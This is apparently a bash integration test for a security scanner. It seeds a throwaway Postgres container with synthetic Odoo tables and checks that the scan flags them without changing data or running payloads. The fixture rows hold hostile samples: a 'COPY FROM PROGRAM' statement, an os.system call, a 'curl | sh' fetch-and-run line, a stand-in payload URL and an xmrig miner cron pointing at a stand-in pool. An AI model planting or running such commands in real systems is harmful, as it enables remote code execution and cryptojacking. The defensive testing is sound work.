#!/usr/bin/env bash
# Real disposable Postgres with synthetic Odoo technical tables + ZATCA immutability.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
# shellcheck disable=SC1091
source "$ROOT/tests/helpers/s1_platform.sh"
s3_platform_source
export DOCKER_HOST="${DOCKER_HOST:-unix:///Users/raafatagha/.colima/default/docker.sock}"
export SOVIEZ_SH_ROOT="$ROOT"
export SOVIEZ_TEST_MODE=1
export SOVIEZ_S3_REQUIRE_ODOO_SCHEMA=1

rid="$(s3_run_id)"
trap 'docker rm -f "${rid}-pg" >/dev/null 2>&1 || true' EXIT

docker run -d --name "${rid}-pg" \
  -e POSTGRES_PASSWORD=s3test -e POSTGRES_USER=soviez_admin postgres:16-alpine >/dev/null

for i in $(seq 1 30); do
  docker exec "${rid}-pg" pg_isready -U soviez_admin >/dev/null 2>&1 && break
  sleep 1
done

SQL_FILE="$(mktemp)"
cat >"$SQL_FILE" <<'SQL'
CREATE TABLE ir_act_server (
  id serial PRIMARY KEY,
  name text,
  code text,
  active boolean DEFAULT true
);
CREATE TABLE ir_config_parameter (
  id serial PRIMARY KEY,
  key text,
  value text
);
CREATE TABLE ir_ui_view (
  id serial PRIMARY KEY,
  name text,
  arch_db text,
  active boolean DEFAULT true
);
CREATE TABLE ir_cron (
  id serial PRIMARY KEY,
  cron_name text,
  code text,
  active boolean DEFAULT true
);
CREATE TABLE base_automation (
  id serial PRIMARY KEY,
  name text,
  code text,
  active boolean DEFAULT true
);
CREATE TABLE res_users (
  id serial PRIMARY KEY,
  login text,
  active boolean DEFAULT true
);
CREATE TABLE res_groups (
  id serial PRIMARY KEY,
  name text
);
CREATE TABLE ir_module_module (
  id serial PRIMARY KEY,
  name text,
  state text
);
CREATE TABLE account_move_zatca_fixture (
  id serial PRIMARY KEY,
  invoice_uuid text,
  invoice_hash text,
  signed_xml text,
  l10n_sa_invoice_signature text,
  chain_index int,
  ccsid text,
  pcsid text,
  edi_state text
);

INSERT INTO ir_act_server(name,code,active) VALUES
  ('Benign','env[''res.partner''].search([])',true),
  ('CopyProg','COPY x FROM PROGRAM ''/bin/true''',true),
  ('OsSys','os.system(''id'')',true);
INSERT INTO ir_config_parameter(key,value) VALUES
  ('web.base.url','https://portal.example.com'),
  ('evil.ioc','http://payload-cdn.evil.example.test/drop.sh');
INSERT INTO ir_ui_view(name,arch_db,active) VALUES
  ('ok','<form><field name="name"/></form>',true),
  ('panel','<t>bash -c "curl http://x|sh"</t>',true);
INSERT INTO ir_cron(cron_name,code,active) VALUES
  ('mine','xmrig --url stratum+tcp://evil-miner-pool.example.test:3333',true);
INSERT INTO base_automation(name,code,active) VALUES
  ('auto','print(1)',true);
INSERT INTO res_users(login,active) VALUES ('admin',true);
INSERT INTO res_groups(name) VALUES ('Administration / Settings');
INSERT INTO ir_module_module(name,state) VALUES ('base','installed');
INSERT INTO account_move_zatca_fixture(
  invoice_uuid, invoice_hash, signed_xml, l10n_sa_invoice_signature,
  chain_index, ccsid, pcsid, edi_state
) VALUES (
  '11111111-1111-1111-1111-111111111111',
  'abc123hash',
  '<Invoice/>',
  'sigdata',
  7,
  'ccsid',
  'pcsid',
  'sent'
);
SQL
docker exec -i -e PGPASSWORD=s3test "${rid}-pg" psql -U soviez_admin -d postgres -v ON_ERROR_STOP=1 <"$SQL_FILE"
rm -f "$SQL_FILE"

# Pre-scan ZATCA hash
pre="$(docker exec -e PGPASSWORD=s3test "${rid}-pg" psql -U soviez_admin -d postgres -At -c \
  "SELECT md5(invoice_uuid||invoice_hash||signed_xml||l10n_sa_invoice_signature||chain_index::text||ccsid||pcsid||edi_state) FROM account_move_zatca_fixture WHERE id=1;")"

export SOVIEZ_SEC_PG_CONTAINER="${rid}-pg"
export SOVIEZ_SEC_PG_ADMIN_USER=soviez_admin
export SOVIEZ_SEC_PG_ADMIN_PASS=s3test
export SOVIEZ_SEC_PG_DB=postgres
export SOVIEZ_SEC_S3_EVIDENCE_ROOT
SOVIEZ_SEC_S3_EVIDENCE_ROOT="$(mktemp -d)"

evidence="$(soviez_s3_evidence_init "s3-db-real")"
set +e
out="$(soviez_s3_db_scan "$evidence")"
rc=$?
set -e
echo "$out" | tee "$evidence/findings/raw_out.json" >/dev/null
echo "$out" | grep -q 'SDB001_COPY_PROGRAM'
echo "$out" | grep -q '"mutation_count": 0'
echo "$out" | grep -q '"executed_payloads": 0'
[[ $rc -eq 2 ]]  # FAIL expected due to CRITICAL

# Post-scan ZATCA identical
post="$(docker exec -e PGPASSWORD=s3test "${rid}-pg" psql -U soviez_admin -d postgres -At -c \
  "SELECT md5(invoice_uuid||invoice_hash||signed_xml||l10n_sa_invoice_signature||chain_index::text||ccsid||pcsid||edi_state) FROM account_move_zatca_fixture WHERE id=1;")"
[[ "$pre" == "$post" ]]

# Row count unchanged for technical tables
cnt="$(docker exec -e PGPASSWORD=s3test "${rid}-pg" psql -U soviez_admin -d postgres -At -c \
  "SELECT count(*) FROM ir_act_server;")"
[[ "$cnt" == "3" ]]

echo "PASS test_db_scan_real_odoo_schema"
